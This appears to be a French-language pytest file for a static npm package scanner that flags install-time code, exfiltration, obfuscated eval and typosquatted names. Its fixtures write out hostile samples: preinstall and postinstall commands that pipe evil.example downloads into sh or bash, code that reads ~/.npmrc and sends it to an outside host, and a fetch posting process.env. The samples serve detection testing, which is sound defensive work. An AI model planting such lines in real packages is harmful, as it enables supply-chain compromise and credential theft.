"""Analyse statique npm (B) : les archives .tgz sont lues en mémoire, jamais extraites ni exécutées.

Points d'exécution de npm : les scripts preinstall/install/postinstall de package.json (et les
fichiers qu'ils lancent), puis le fichier principal au `require`.
"""
import io
import json
import tarfile
from pathlib import Path

from commun.modeles import Ecosysteme, Niveau
from plateforme.pipeline.statique.code import controler_code
from plateforme.pipeline.statique.nom import controler_nom

N = Ecosysteme.NPM


def tgz(chemin: Path, fichiers: dict[str, str], scripts: dict | None = None,
        main: str | None = None) -> Path:
    pj = {"name": "demo", "version": "1.0.0", **({"scripts": scripts} if scripts else {}),
          **({"main": main} if main else {})}
    with tarfile.open(chemin, "w:gz") as t:
        for nom, texte in {"package.json": json.dumps(pj), **fichiers}.items():
            octets = texte.encode()
            info = tarfile.TarInfo(f"package/{nom}")
            info.size = len(octets)
            t.addfile(info, io.BytesIO(octets))
    return chemin


def sortes(tmp_path, fichiers, **kw) -> dict[str, Niveau]:
    signaux = controler_code(N, "demo", "1.0.0", [tgz(tmp_path / "demo-1.0.0.tgz", fichiers, **kw)])
    return {s.sorte: s.niveau for s in signaux}


def test_un_paquet_sain_ne_leve_rien_de_fort(tmp_path):
    s = sortes(tmp_path, {"index.js": "module.exports = (a, b) => a + b;\n",
                          "lib/http.js": "const https = require('https');\nhttps.get(url);\n"})
    assert all(n.rang < Niveau.FORT.rang for n in s.values())


def test_un_postinstall_qui_lance_un_script_dangereux_est_fort(tmp_path):
    s = sortes(tmp_path, {"setup.js": "const cp = require('child_process');\n"
                                      "cp.execSync('curl -s http://evil.example/x | sh');\n"},
               scripts={"postinstall": "node setup.js"})
    assert s["code_installation"] is Niveau.FORT


def test_un_script_en_ligne_qui_telecharge_et_execute_est_fort(tmp_path):
    s = sortes(tmp_path, {}, scripts={"preinstall": "curl -s https://evil.example/i.sh | bash"})
    assert s["code_installation"] is Niveau.FORT


def test_un_script_d_installation_banal_n_est_qu_un_indice(tmp_path):
    s = sortes(tmp_path, {}, scripts={"install": "node-gyp rebuild"})
    assert s == {"script_installation": Niveau.MOYEN}


def test_voler_npmrc_et_l_envoyer_au_require_est_bloquant(tmp_path):
    s = sortes(tmp_path, {"index.js": "const os = require('os'), fs = require('fs');\n"
                                      "const t = fs.readFileSync(os.homedir() + '/.npmrc');\n"
                                      "require('https').request({host: 'collecte.invalid'});\n"})
    assert s["exfiltration"] is Niveau.BLOQUANT and s["acces_secrets"] is Niveau.FORT


def test_le_fichier_principal_declare_est_un_point_d_execution(tmp_path):
    s = sortes(tmp_path, {"dist/main.js": "fetch('https://x.invalid', {body: "
                                          "JSON.stringify(process.env)});\n"}, main="dist/main.js")
    assert s["exfiltration"] is Niveau.BLOQUANT


def test_eval_de_base64_et_webhook_sont_forts_partout(tmp_path):
    s = sortes(tmp_path, {"lib/a.js": "eval(Buffer.from(p, 'base64').toString());\n",
                          "lib/b.js": "const u = 'https://webhook.site/abc';\n"})
    assert s["exec_obfusque"] is Niveau.FORT and s["domaine_suspect"] is Niveau.FORT


def test_les_tests_et_node_modules_ne_sont_pas_lus(tmp_path):
    s = sortes(tmp_path, {"test/a.js": "eval(atob(x));\n", "node_modules/x/index.js":
                          "const u = 'https://webhook.site/abc';\n",
                          "lib/a.spec.js": "eval(atob(x));\n"})
    assert s == {}


def test_seul_ce_qui_est_nouveau_compte(tmp_path):
    avant = tgz(tmp_path / "demo-0.9.0.tgz", {"lib/b.js": "const u = 'https://webhook.site/a';\n"})
    apres = tgz(tmp_path / "demo-1.0.0.tgz", {"lib/b.js": "const u = 'https://webhook.site/a';\n",
                                              "lib/c.js": "eval(atob(x));\n"})
    signaux = controler_code(N, "demo", "1.0.0", [apres], precedentes=[avant])
    assert [s.sorte for s in signaux] == ["exec_obfusque"]


def test_une_archive_illisible_est_forte(tmp_path):
    a = tmp_path / "demo-1.0.0.tgz"
    a.write_bytes(b"pas une archive")
    assert {s.sorte for s in controler_code(N, "demo", "1.0.0", [a])} == {"archive_illisible"}


def test_typosquat_npm_avec_la_liste_npm():
    assert controler_nom(N, "expresss", "1.0.0")[0].preuve["cible"] == "express"
    assert controler_nom(N, "express", "4.0.0") == []
    assert controler_nom(N, "@types/node", "1.0.0") == []
    # La liste npm, pas celle de PyPI : « numpyy » imite numpy (PyPI), absent de la liste npm.
    assert controler_nom(N, "numpyy", "1.0.0") == []
    assert controler_nom(Ecosysteme.PYPI, "numpyy", "1.0.0")[0].preuve["cible"] == "numpy"


def test_un_fichier_minifie_avec_eval_et_atob_loin_l_un_de_l_autre_n_est_pas_obfusque(tmp_path):
    """json5, prisma, next : tout le code sur une ligne, eval et atob sans rapport."""
    ligne = "!function(){var t=eval(x);" + "x=1;" * 200 + "var u=atob(s);}();\n"
    assert "exec_obfusque" not in sortes(tmp_path, {"dist/index.min.js": ligne})


def test_new_function_sur_du_base64_est_obfusque(tmp_path):
    assert sortes(tmp_path, {"lib/a.js": "new Function(atob(code))();\n"})["exec_obfusque"] \
        is Niveau.FORT


def test_un_domaine_cite_en_commentaire_n_est_pas_suspect(tmp_path):
    """core-js : « // causes a crash (https://pastebin.com/…) »."""
    assert sortes(tmp_path, {"lib/a.js": "// voir https://pastebin.com/N21QzeQA\n"
                                         " * https://webhook.site/doc\n"}) == {}
